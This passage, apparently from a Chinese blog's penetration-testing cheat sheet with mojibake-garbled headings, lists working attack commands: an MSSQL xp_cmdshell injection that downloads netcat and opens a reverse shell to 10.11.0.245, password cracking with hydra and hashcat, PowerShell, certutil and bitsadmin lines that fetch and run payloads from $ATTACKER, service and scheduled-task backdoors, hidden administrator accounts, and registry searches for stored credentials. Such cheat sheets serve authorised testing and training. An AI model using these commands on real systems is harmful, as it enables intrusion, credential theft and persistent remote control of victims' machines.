10</code></pre><p>NetCat(é€‚ç”¨äºxp_cmdshellå¯ç”¨çš„SQL Server)</p><pre><code class="shell"># netcat reverse shell via mssql injection when xp_cmdshell is available1000&#39;;+exec+master.dbo.xp_cmdshell+&#39;(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+&gt;+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd&#39;;--</code></pre><h2 id="å¯†ç æš´ç ´"><a href="#å¯†ç æš´ç ´" class="headerlink" title="å¯†ç æš´ç ´"></a>å¯†ç æš´ç ´</h2><h3 id="hydraç ´è§£WebæœåŠ¡å¯†ç "><a href="#hydraç ´è§£WebæœåŠ¡å¯†ç " class="headerlink" title="hydraç ´è§£WebæœåŠ¡å¯†ç "></a>hydraç ´è§£WebæœåŠ¡å¯†ç </h3><pre><code class="shell">hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list &quot;/endpoit/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot; -s PORT -P /usr/share/wordlists/list</code></pre><h3 id="hydraç ´è§£é€šç”¨åè®®å£ä»¤"><a href="#hydraç ´è§£é€šç”¨åè®®å£ä»¤" class="headerlink" title="hydraç ´è§£é€šç”¨åè®®å£ä»¤"></a>hydraç ´è§£é€šç”¨åè®®å£ä»¤</h3><pre><code class="shell">hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1</code></pre><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><pre><code class="shell"># Bruteforce based on the pattern;hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  # Generate password candidates: wordlist + pattern;hashcat -a6 -m0 &quot;e99a18c428cb38d5f260853678922e03&quot; yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout# Generate NetNLTMv2 with internalMonologue and crack with hashcatInternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800# resulting hashspotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000# crack with hashcathashcat -m5600 &#39;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&#39; -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable</code></pre><h3 id="ç ´è§£zipæ–‡ä»¶å¯†ç "><a href="#ç ´è§£zipæ–‡ä»¶å¯†ç " class="headerlink" title="ç ´è§£zipæ–‡ä»¶å¯†ç "></a>ç ´è§£zipæ–‡ä»¶å¯†ç </h3><pre><code class="shell">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip</code></pre><h2 id="æœ¬åœ°ä¿¡æ¯æŒ–æ˜"><a href="#æœ¬åœ°ä¿¡æ¯æŒ–æ˜" class="headerlink" title="æœ¬åœ°ä¿¡æ¯æŒ–æ˜"></a>æœ¬åœ°ä¿¡æ¯æŒ–æ˜</h2><h3 id="å¯»æ‰¾å¯è¯»-å†™æ–‡ä»¶å¤¹"><a href="#å¯»æ‰¾å¯è¯»-å†™æ–‡ä»¶å¤¹" class="headerlink" title="å¯»æ‰¾å¯è¯»&#x2F;å†™æ–‡ä»¶å¤¹"></a>å¯»æ‰¾å¯è¯»&#x2F;å†™æ–‡ä»¶å¤¹</h3><pre><code class="powershell">$a = Get-ChildItem &quot;c:\windows\&quot; -recurse -ErrorAction SilentlyContinue$a | % &#123;    $fileName = $_.fullname    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? &#123;$_.filesystemrights -match &quot;full|modify|write&quot; -and $_.identityreference -match &quot;authenticated users|everyone|$env:username&quot;&#125;    if($acls -ne $null)    &#123;        [pscustomobject]@&#123;            filename = $fileName            user = $acls | select -exp identityreference        &#125;    &#125;&#125;</code></pre><h3 id="æ£€æŸ¥æ˜¯å¦å·²å¯ç”¨Powershellæ—¥å¿—è®°å½•"><a href="#æ£€æŸ¥æ˜¯å¦å·²å¯ç”¨Powershellæ—¥å¿—è®°å½•" class="headerlink" title="æ£€æŸ¥æ˜¯å¦å·²å¯ç”¨Powershellæ—¥å¿—è®°å½•"></a>æ£€æŸ¥æ˜¯å¦å·²å¯ç”¨Powershellæ—¥å¿—è®°å½•</h3><pre><code class="shell">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLoggingreg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</code></pre><h3 id="æ£€æŸ¥WinEventæ—¥å¿—ä¸­æ˜¯å¦æœ‰SecureString"><a href="#æ£€æŸ¥WinEventæ—¥å¿—ä¸­æ˜¯å¦æœ‰SecureString" class="headerlink" title="æ£€æŸ¥WinEventæ—¥å¿—ä¸­æ˜¯å¦æœ‰SecureString"></a>æ£€æŸ¥WinEventæ—¥å¿—ä¸­æ˜¯å¦æœ‰SecureString</h3><pre><code class="powershell">Get-WinEvent -FilterHashtable @&#123;LogName=&#39;Microsoft-Windows-PowerShell/Operational&#39;; ID=4104&#125; | Select-Object -Property Message | Select-String -Pattern &#39;SecureString&#39;</code></pre><h3 id="æ£€æŸ¥WinEventçš„æœºå™¨å”¤é†’-ç¡çœ æ—¶é—´"><a href="#æ£€æŸ¥WinEventçš„æœºå™¨å”¤é†’-ç¡çœ æ—¶é—´" class="headerlink" title="æ£€æŸ¥WinEventçš„æœºå™¨å”¤é†’&#x2F;ç¡çœ æ—¶é—´"></a>æ£€æŸ¥WinEventçš„æœºå™¨å”¤é†’&#x2F;ç¡çœ æ—¶é—´</h3><pre><code class="pwoershell">Get-WinEvent -FilterHashTable @&#123; ProviderName = &#39;Microsoft-Windows-Power-TroubleShooter&#39;  ; Id = 1 &#125;|Select-Object -Property @&#123;n=&#39;Sleep&#39;;e=&#123;$_.Properties[0].Value&#125;&#125;,@&#123;n=&#39;Wake&#39;;e=&#123;$_.Properties[1].Value&#125;&#125;</code></pre><h2 id="æ–‡ä»¶ä¼ è¾“"><a href="#æ–‡ä»¶ä¼ è¾“" class="headerlink" title="æ–‡ä»¶ä¼ è¾“"></a>æ–‡ä»¶ä¼ è¾“</h2><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><pre><code class="shell">#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftpservice atftpd start# Windowstftp -i $ATTACKER get /download/location/file /save/location/file</code></pre><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><pre><code class="shell"># Linux: set up ftp server with anonymous logon access;twistd -n ftp -p 21 -r /file/to/serve# Windows shell: read FTP commands from ftp-commands.txt non-interactively;echo open $ATTACKER&gt;ftp-commands.txtecho anonymous&gt;&gt;ftp-commands.txtecho whatever&gt;&gt;ftp-commands.txtecho binary&gt;&gt;ftp-commands.txtecho get file.exe&gt;&gt;ftp-commands.txtecho bye&gt;&gt;ftp-commands.txt ftp -s:ftp-commands.txt# Or just a one-liner(echo open 10.11.0.245&amp;echo anonymous&amp;echo whatever&amp;echo binary&amp;echo get nc.exe&amp;echo bye) &gt; ftp.txt &amp; ftp -s:ftp.txt &amp; nc.exe 10.11.0.245 443 -e cmd</code></pre><h3 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h3><pre><code class="shell">certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe</code></pre><h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http://10.11.0.245/nc.exe&#39;, &#39;C:\\Temp\\nc.exe&#39;)&quot;</code></pre><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><pre><code class="shell">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe&quot; &#125;powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;powershell -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;)&quot;; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/file.exe&#39;,&#39;file.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;file.exe&#39;);# download using default proxy credentials and launchpowershell -command &#123; $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString(&quot;http://$attacker/nc.exe&quot;) | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;</code></pre><h3 id="VBScript"><a href="#VBScript" class="headerlink" title="VBScript"></a>VBScript</h3><pre><code class="shell">cscript wget.vbs http://$ATTACKER/file.exe localfile.exe</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code class="shell">wget http://$ATTACKER/filecurl http://$ATTACKER/file -Oscp ~/file/file.bin user@$TARGET:tmp/backdoor.py</code></pre><h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><pre><code class="shell"># Attackernc -l -p 4444 &lt; /tool/file.exe# Victimnc $ATTACKER 4444 &gt; file.exe</code></pre><h3 id="Windows-â€œdebug-exeâ€-Method"><a href="#Windows-â€œdebug-exeâ€-Method" class="headerlink" title="Windows â€œdebug.exeâ€ Method"></a>Windows â€œdebug.exeâ€ Method</h3><pre><code class="shell"># 1. In Linux, convert binary to hex ascii:wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt# 2. Paste nc.txt into Windows Shell.</code></pre><h3 id="Windows-BitsAdmin"><a href="#Windows-BitsAdmin" class="headerlink" title="Windows BitsAdmin"></a>Windows BitsAdmin</h3><pre><code class="shell">cmd.exe /c &quot;bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&amp;start %tmp%\payload.exe</code></pre><h2 id="åæ¸—é€"><a href="#åæ¸—é€" class="headerlink" title="åæ¸—é€"></a>åæ¸—é€</h2><h3 id="åˆ©ç”¨æœåŠ¡è¿›è¡ŒæŒä¹…åŒ–"><a href="#åˆ©ç”¨æœåŠ¡è¿›è¡ŒæŒä¹…åŒ–" class="headerlink" title="åˆ©ç”¨æœåŠ¡è¿›è¡ŒæŒä¹…åŒ–"></a>åˆ©ç”¨æœåŠ¡è¿›è¡ŒæŒä¹…åŒ–</h3><pre><code class="shell"># cmdsc create spotlessSrv binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;# powersehllNew-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName &quot;&#39;C:\Program Files\NotEvil\back.exe&#39;&quot; -Description &quot;Not at all&quot;</code></pre><h3 id="åˆ›å»ºæŒä¹…åŒ–åé—¨"><a href="#åˆ›å»ºæŒä¹…åŒ–åé—¨" class="headerlink" title="åˆ›å»ºæŒä¹…åŒ–åé—¨"></a>åˆ›å»ºæŒä¹…åŒ–åé—¨</h3><pre><code class="shell"># Launch evil.exe every 10 minutesschtasks /create /sc minute /mo 10 /tn &quot;TaskName&quot; /tr C:\Windows\system32\evil.exe</code></pre><h3 id="åˆ›å»ºç”¨æˆ·å¹¶æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„"><a href="#åˆ›å»ºç”¨æˆ·å¹¶æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„" class="headerlink" title="åˆ›å»ºç”¨æˆ·å¹¶æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„"></a>åˆ›å»ºç”¨æˆ·å¹¶æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„</h3><pre><code class="shell">net user spotless spotless /add &amp; net localgroup Administrators spotless /add</code></pre><h3 id="éšè—ç”¨æˆ·"><a href="#éšè—ç”¨æˆ·" class="headerlink" title="éšè—ç”¨æˆ·"></a>éšè—ç”¨æˆ·</h3><pre><code class="shell">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /t REG_DWORD /v spotless /d 0 /f</code></pre><h3 id="åˆ©ç”¨æœåŠ¡é…ç½®é”™è¯¯è¿›è¡Œææƒ"><a href="#åˆ©ç”¨æœåŠ¡é…ç½®é”™è¯¯è¿›è¡Œææƒ" class="headerlink" title="åˆ©ç”¨æœåŠ¡é…ç½®é”™è¯¯è¿›è¡Œææƒ"></a>åˆ©ç”¨æœåŠ¡é…ç½®é”™è¯¯è¿›è¡Œææƒ</h3><pre><code class="shell"># Look for SERVICE_ALL_ACCESS in the outputaccesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *sc config [service_name] binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;sc qc [service_name] (to verify!)sc start [service_name]</code></pre><h3 id="é€’å½’æŸ¥æ‰¾éšè—æ–‡ä»¶"><a href="#é€’å½’æŸ¥æ‰¾éšè—æ–‡ä»¶" class="headerlink" title="é€’å½’æŸ¥æ‰¾éšè—æ–‡ä»¶"></a>é€’å½’æŸ¥æ‰¾éšè—æ–‡ä»¶</h3><pre><code class="shell">dir /A:H /s &quot;c:\program files&quot;</code></pre><h3 id="æ£€æŸ¥æ–‡ä»¶-ç›®å½•æƒé™"><a href="#æ£€æŸ¥æ–‡ä»¶-ç›®å½•æƒé™" class="headerlink" title="æ£€æŸ¥æ–‡ä»¶&#x2F;ç›®å½•æƒé™"></a>æ£€æŸ¥æ–‡ä»¶&#x2F;ç›®å½•æƒé™</h3><pre><code class="shell">icacls.exe C:\folder /findsid userName-or-*sid /t//look for (F)ull, (M)odify, (W)rite</code></pre><h3 id="æ£€æŸ¥Windowså­˜å‚¨çš„å‡­æ®"><a href="#æ£€æŸ¥Windowså­˜å‚¨çš„å‡­æ®" class="headerlink" title="æ£€æŸ¥Windowså­˜å‚¨çš„å‡­æ®"></a>æ£€æŸ¥Windowså­˜å‚¨çš„å‡­æ®</h3><pre><code class="shell">c:\unattend.xmlc:\sysprep.infc:\sysprep\sysprep.xmldir c:\*vnc.ini /s /bdir c:\*ultravnc.ini /s /b dir c:\ /s /b | findstr /si *vnc.inifindstr /si password *.txt | *.xml | *.inifindstr /si pass *.txt | *.xml | *.inidir /s *cred* == *pass* == *.conf# Windows Autologonreg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;# VNCreg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;# Puttyreg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;# Registryreg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s</code></pre><h3 id="æ£€æŸ¥æœªæ³¨å†Œï¼ˆå¼•ç”¨ï¼‰çš„æœåŠ¡"><a href="#æ£€æŸ¥æœªæ³¨å†Œï¼ˆå¼•ç”¨ï¼‰çš„æœåŠ¡" class="headerlink" title="æ£€æŸ¥æœªæ³¨å†Œï¼ˆå¼•ç”¨ï¼‰çš„æœåŠ¡"></a>æ£€æŸ¥æœªæ³¨å†Œï¼ˆå¼•ç”¨ï¼‰çš„æœåŠ¡</h3><pre><code class="shell">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code></pre><h3 id="å¼€å¯è¿›ç¨‹"><a href="#å¼€å¯è¿›ç¨‹" class="headerlink" title="å¼€å¯è¿›ç¨‹"></a>å¼€å¯è¿›ç¨‹</h3><h4 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code class="shell"># Requires PSRemoting$username = &#39;Administrator&#39;;$password = &#39;1234test&#39;;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command &#123; whoami &#125;# without PSRemotingcmd&gt; powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;, (ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))# without PS Remoting, with argumentscmd&gt; powershell -command &quot;start-process cmd.exe -argumentlist &#39;/c calc&#39; -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;,(ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))&quot;</code></pre><h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><pre><code class="shell"># Requires interactive consolerunas /user:userName cmd.exe</code></pre><h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><pre><code class="shell">psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe</code></pre><h4 id="Pth-WinExe"><a href="#Pth-WinExe" class="headerlink" title="Pth-WinExe"></a>Pth-WinExe</h4><pre><code class="shell">pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe</code></pre><h2 id="å†…ç½‘ç©¿é€"><a href="#å†…ç½‘ç©¿é€" class="headerlink" title="å†…ç½‘ç©¿é€"></a>å†…ç½‘ç©¿é€</h2><h3 id="SSHæœ¬åœ°ç«¯å£è½¬å‘"><a href="#SSHæœ¬åœ°ç«¯å£è½¬å‘" class="headerlink" title="SSHæœ¬åœ°ç«¯å£è½¬å‘"></a>SSHæœ¬åœ°ç«¯å£è½¬å‘</h3><pre><code class="shell"># Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER# Scenario: access a host that&#39;s being blocked by a firewall via SSH_SERVER;ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER</code></pre><h3 id="SSHåŠ¨æ€ç«¯å£è½¬å‘"><a href="#SSHåŠ¨æ€ç«¯å£è½¬å‘" class="headerlink" title="SSHåŠ¨æ€ç«¯å£è½¬å‘"></a>SSHåŠ¨æ€ç«¯å£è½¬å‘</h3><pre><code class="shell"># Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;ssh -D 127.0.0.1:8080 user@SSH_SERVER</code></pre><h3 id="SSHè¿œç¨‹ç«¯å£è½¬å‘"><a href="#SSHè¿œç¨‹ç«¯å£è½¬å‘" class="headerlink" title="SSHè¿œç¨‹ç«¯å£è½¬å‘"></a>SSHè¿œç¨‹ç«¯å£è½¬å‘</h3><pre><code class="shell"># Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389# Scenario: expose RDP on non-routable network;ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVERplink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP</code></pre><h3 id="Proxy-Tunnel"><a href="#Proxy-Tunnel" class="headerlink" title="Proxy Tunnel"></a>Proxy Tunnel</h3><pre><code class="shell"># Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128# Scenario: a remote host has SSH running, but it&#39;s only bound to 127.0.0.1, but you want to reach it;proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555ssh user@127.0.0.1 -p 5555</code></pre><h3 id="HTTPéš§é“-SSH-Over-HTTP"><a href="#HTTPéš§é“-SSH-Over-HTTP" class="headerlink" title="HTTPéš§é“: SSH Over HTTP"></a>HTTPéš§é“: SSH Over HTTP</h3><pre><code class="shell"># Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22hts -F localhost:22 80# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80htc -F 8080 192.168.1.15:80# Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22ssh localhost -p 8080</code></pre><h3 id="netshç«¯å£è½¬å‘"><a href="#netshç«¯å£è½¬å‘" class="headerlink" title="netshç«¯å£è½¬å‘"></a>netshç«¯å£è½¬å‘</h3><pre><code class="shell">#æ·»åŠ ä¸€ä¸ªIPV4åˆ°IPV4çš„ç«¯å£æ˜ å°„netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.75.130 Â connectport=8080#æŒ‡å®šç›‘å¬ipå’Œç«¯å£å¯ä»¥åˆ é™¤netshÂ interfaceÂ portproxyÂ deleteÂ v4tov4Â listenaddress=0.0.0.0Â listenport=4445#æŸ¥çœ‹å­˜åœ¨çš„è½¬å‘netsh interfaceÂ portproxyÂ showÂ all</code></pre><blockquote><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">Pentesting Cheatsheets</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CheckList </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
